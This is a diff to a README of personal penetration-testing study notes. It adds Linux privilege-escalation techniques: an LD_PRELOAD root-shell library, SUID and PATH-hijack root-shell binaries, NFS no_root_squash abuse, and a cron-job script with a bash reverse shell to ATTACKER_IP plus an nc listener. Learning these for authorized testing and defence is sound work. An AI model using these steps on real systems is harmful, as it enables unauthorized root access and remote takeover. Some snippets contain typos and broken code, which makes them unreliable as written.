@@ -117,9 +117,15 @@ This repository documents my hands-on learning and notes in Vulnerability Assess
 - MsfVenom
 - Multi/Handler
 
-### Privilege Escalation
-- Linux Privelege Escalation
-- Common commands to navigate and understand the compromised system
+### Linux Privilege Escalation
+- Enumeration
+- Privilege Escaltion: Kernel Exploits
+- Privilege Escalation: Sudo
+- Privilege Escaltion: SUID
+- Privilege Escalation:  Capabilities
+- Privilege Escalation: Cron Jobs
+- Privilege Escalation: PATH
+- Privilege Escalation: NFS
 
   
 
@@ -744,11 +750,9 @@ This repository documents my hands-on learning and notes in Vulnerability Assess
 
 * This is for LINUX target machine. For windows also it is the same but the command to download the payload from the attacker server is different and execution of the file is also different.
 
-# PRIVILEGE ESCALATION:
+# LINUX PRIVILEGE ESCALATION:
 
-- going from lower permission to a higher permission.
-
-  ## Linux Privilege Escalation
+- going from lower permission to a higher permission in LINUX target machine.
 
   - Enumeration:
 
@@ -808,6 +812,269 @@ This repository documents my hands-on learning and notes in Vulnerability Assess
 			$ find / -perm -u=s -type f 2>dev/null (files with the SUID bit)
     		-> this allows us to run fule with a higher privilege than the current level we end up with while getting the linux shell)
 
+
+## Privilege Escalation: Kernel Exploits
+
+- Identifying the kernel version
+
+- Searching and finding the exploit code by researching the version of the target system
+
+- Serving a web server to transfer the exploit to the target machine
+
+- Downloading the exploit in the target machine (/tmd folder is usaully safe for this) and giving it executable permissions
+
+- Compiling and executing
+
+- Running the exploit
+
+- Solution:
+
+  	-> Keeping checks on the kernel updates and patches to be safe from known vulnerabilites.
+
+  	-> Enforcing SELinux or AppArmor policies so it blocks unauthorized code execution. (for eg: preventing the execution of malicious code in common /tmp directories).
+
+  	-> Detecting aunauthorized use of gcc or other compilers by non-admin users.
+
+## Privilege Escalation: Sudo
+
+- Low level users do not have higher privileges to run programs with root privileges. So, because of some situations, system administrators might provide regular users some flexibility on their privileges. By checking the root privileges of a low level user, we can further escalate into the root user.
+
+			$ sudo -l (checking the users root privileges)
+
+  - Use of GTFObins to search for exploits and commands that could provide root access depending on the type of privilege user currently has.
+ 
+  - Leveraging LD_PRELOAD: LD_PRELOAD is a function which allows any program to use shared libraries and we can find it within the context of checking root privileges in the field of 'env_keep'.
+
+- Steps for escalating this function:
+
+		-> Checking for LD_PRELOAD
+
+		-> Writing a simple C code which shhould be complied as a share object (.so extension)
+
+		-> running the program with sudo rights and the LD_PRELOAD option to the .so file
+
+  				#include<stdio.h>
+  
+  				#include<sys/types.h>
+  
+  				#include<stdlib.h>
+  
+  
+
+  				void_init() {
+  
+  				unsetenv("LD_PRELOAD");
+  
+  				setgid(0);
+  
+  				setuid(0);
+  
+  				system("/bin/bash");
+  				}
+
+				$ gcc -fPIC -shared -o shell.so shell.c -nostartfiles
+
+  - Now we can find almost any program our user can run with sudo
+ 
+    	$ sudo LD_PRELOAD=/home/nischal/ldpreload/shell.so find
+
+
+## Privilege Escalation: SUID
+
+- Files can have read, write and execute permissions. But, with SUID things are different, any files could be executed with the permission level of the file owner or the group owner. We could notice it with the "s" bit set showing their special permission.
+
+  		$ find / -type f -perm -04000 -ls 2?/dev/null
+
+  - SUID bit set for any low level commands such as nano, base64, e.t.c could result in the full compromise of the system beacuse we could further escalate the privilege by gaining access to the /etc/shadow file or simple exploiting the base64 read command for every files in the system.
+
+- GTFObins is a reliable tool for using suchh exploits as well.
+
+## Privilege Escalation:Capabilities
+
+- Increasing the privilege level of a process or binary to help manage privileges at more granular level is "Capabilites". For example, a SOC analyst needs a tool to initiate socket connections which a regular user would not be able to do. So system administrators change the capabilites of the binary if they do not want to give them the privilege of a higher level user.
+
+  		$ getcap -r / 2>/dev/null
+
+		-> If we get a result such as: /home/nischal/vim = cap_setuid+ep, then we know that this capabilites has a SUID bit set. This privilege escalation vector is not discoverable when enumerating the file itself looking for SUID. So, once again we can check the GTFO bins to check the list of binaries that could be leveraged for privilege escaltion.
+
+## Privilege Escaltion: Cron Jobs
+
+- Cron jobs are mainly used for running scripts or binaries at specific times. If there is scheduled task that runs with root privileges then we can change the script that will be run at the time and run our script to escalate the privilege to the root. (By default they run with the privilege of their owners and not the current user)
+
+  		$ cat /etc/crontab
+
+  		-> So, if we see that a file "backup.sh" runs with the root privilege at a certain time say like every 5 minutes then we can modify this script to give us a shell with the root privilege.
+
+  		$ nano backup.sh (assuming we found this script)
+
+		#!/bin/bash
+
+  		bash -i >& /dev/tcp/ATTACKER_IP/7777 0>&1
+
+  		-> everything in this script needs to be changed with the command above. The goal here is to obtain a reverse shell in the attacking machine. Commands like 'nc' will not work in this case or it depends on the available tools.
+
+  		* reverse shells are always prefferable beacuse we do not want to compromise the system integrity during real penetration tesing engagement.
+
+  		- Then, we will run a listener on our attacking machine to receive the incoming connection.
+
+  		$ nc -nlvp 7777
+
+  		- Assuming the script will run every five minutes, we should just wait until the script will run and we will get the reverse shell on our attacking machine with the root id.
+
+- Crontab is worth checking beacuse of its easy privilege escaltion vectors.
+
+- It is also worth to understand the function of the script and how any tool is used within the context such as tar,7z.rsync,e.t.c.
+
+- Such type of scripts are usually left unchecked because of certain levels of understanding of such exploits by system administrators. So cleaning the relevant cron job after the script becomes useless is very important.
+
+## Privilege Escaltion: PATH
+
+- PATH in Linux is an environmental variable that commands the operating system where to search for executables. So, if a folder for which the compromised user has written permission to is lacated in the PATH, we could hijack an application to run a script.
+
+- For any command that is not built into the shell or which is not defined with an absolute path, Linux will try to search it in folders defined under $PATH.
+
+  		$ echo$PATH (see what is in the PATH)
+
+		-> If we type nischal to the command line, then Linux will look for an executable called "nischal" in the PATH.
+
+  - Leveraging this environmental variable solely depends on the existing configuration of the target system. So, it is always a good idea to ask yourself these questions before trying to run a script:
+ 
+    	-> Under $PATH, what folders are located?
+
+		-> Do the current user has write privileges for any of these folders?
+
+		-> Can you modify $PATH?
+
+		-> Is there a script/application you can start that will be affected by this vulnerability?
+
+	- We will be using a simple script for demo purpose to take advantage of this vulnerability
+ 
+    		$ nano path.c
+
+			#include<unistd.h>
+    
+
+			void main() {
+
+			setuid(0);
+
+			setgid(0);
+
+			system("nischal");
+
+			}
+
+			-> Here, the script tries to launch a system binary called "nischal", however we can use any binary here.
+
+			-> First, we need to compile this script into an executable and set the SUID bit.
+
+			$ gcc path.c -o path -w
+
+			$ chmod u+s path
+
+			$ ls -l (should give the file "s" bit)
+
+			-> Once this gets executed, "path" will look for an executable name "nischal" inside folders listed under PATH
+
+			-> If any writable folder falls under PATH, then we can create a binary name "nischal" under that directory and have our "path" script run in it. AS we have set the SUID bit, the binary will run with root privilege.
+
+			$ find / -writable 2>/dev/null | cut -d "/" -f 2 | sort -u
+
+			-> This command will search for writable files where we could write our script to.
+
+			-> After this we can compare it with the PATH to find folders we could use.
+
+			-> We could use /tmp directory beacuse it is used for temporary executable files and is a standard, shared space for transient data. It is easier to write folder also. So, if /tmp: is not in the $PATH variable then we could add it using:
+
+				$ export PATH=/tmp:$PATH
+
+			 -> At this point, the path script will also look under /tmp folder for an executable named "nischal". So the next thing we need to do is copying /bin/bash as "nischal" under this folder.
+
+				$ cd /tmp
+
+				$ echo "bin/bash" > nischal
+
+				$ chmod 777 nischal
+
+				$ ls -l nischal
+
+				-> We could see the executable "nischal" on this folder. So, now we need to go back to the directory where we created the "path" script where we set its SUID bit.
+
+				$ ./path
+
+				$ id
+
+				root
+
+## Privilege Escalation: NFS
+
+- Privilege escaltion vectors do not only lie on the internal access, but also shared folders and management interfaces such as SSh and Telnet can help us gain root access on the target system. But, here we will be talking about NFS (Network File Sharing) which is created during the NFS server installation and can be read by users. It is kept in /etc/exports.
+
+  		$ cat /etc/exports
+
+  - The eye catching and critcal element for this type of privilege escalation vector is the "no_root_squash" option. By default, NFS changes the root user to nfsnobody and strip any file from operating with root privileges. If the "no_root_squash" option is present on a writable share, then we can create an executable with SUID bit set and run it on the target system.
+ 
+  - First, we can start by enumerating the mouontable shares from our attacking machine. It is better to use root in the attacking machine as we need to mount to the /tmp directory.
+
+			# showmount -e TARGET_MACHINE_IP
+
+  - If it shows the export list, as it should if the no_root_squash option is seen in the victim machine, we could mount the "no_root_squash" to our attacking machine and create an executable. First, we need to create a folder on the /tmp directory where we will mount the folder from target machine.
+ 
+    		# mkdir /tmp/nischal
+
+			$ mount -o rw TARGET_MACHINE_IP:/FOLDER_WITH NO_ROOT_SQUASH /tmp/nischal
+
+  - As we can set SUID bits, we will use a simple executable that will run /bin/bash on the victim system. For this we need to be on the directory where we have mounted the vulnerable folder of the target machine
+
+			# nano nischal.c
+
+			#include <stdio>
+
+			#include <stdlib.h>		// for system()
+
+			#include <unistd.h>		//for setuid(), setgid()
+
+			int main() {
+
+			setgid(0);
+
+			setuid(0);
+
+			system("/bin/bash");
+
+			return 0;
+	
+
+			-> save and exit
+
+	- Assuming, that target machine doesnot has the latest version of the GLIBC, and does not has compiler so it could compile it itslef, we can use a very large binary so that the execution doesnot fail on the target later on.
+
+			# gcc nischal.c -o nischal -static
+
+			# chmod +s nischal (setting SUID)
+
+			# ls -l nischal
+
+	- So, when we will go back to our target machine, both files (nischal.c and nischal will be already present under the folder which we mounted to the attacking machine. So, basically this is one of the application of a mounted share. Now we just need to run the executable.
+ 
+    		$ ./nischal
+
+			$ id
+
+			uid=0(root) gid=0(root)
+
+	- It is important to notice that the executable file had SUID bit set, that is why the system runs with root privileges.
+    
+ 
+  			
+
+	
+
+	
+
+
+
+  
 			
 
 
